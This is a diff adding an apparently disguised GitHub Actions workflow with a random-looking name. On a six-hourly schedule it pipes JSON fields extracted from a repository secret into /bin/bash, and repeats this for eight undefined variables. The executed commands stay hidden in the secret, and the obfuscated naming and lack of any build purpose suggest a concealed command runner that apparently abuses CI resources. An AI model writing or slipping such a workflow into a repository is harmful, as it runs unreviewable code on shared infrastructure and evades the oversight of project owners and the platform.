@@ -1,0 +1,26 @@
+name: materialfirebase55
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: materialfirebase55
+        env:
+          ha8: ${{ secrets.ha8 }}
+        run: |
+          echo $ha8 | jq -r .vbh51 | /bin/bash
+          echo $pi45 | jq -r .qd9 | /bin/bash
+          echo $ge346 | jq -r .ip1340 | /bin/bash
+          echo $w46129 | jq -r .ctert9438 | /bin/bash
+          echo $sncmi9 | jq -r .y8670 | /bin/bash
+          echo $xhytu4223 | jq -r .mgat930 | /bin/bash
+          echo $xg4931 | jq -r .o3 | /bin/bash
+          echo $osopr433 | jq -r .yb18423 | /bin/bash
+          echo $kb73888 | jq -r .idbs8246 | /bin/bash
+
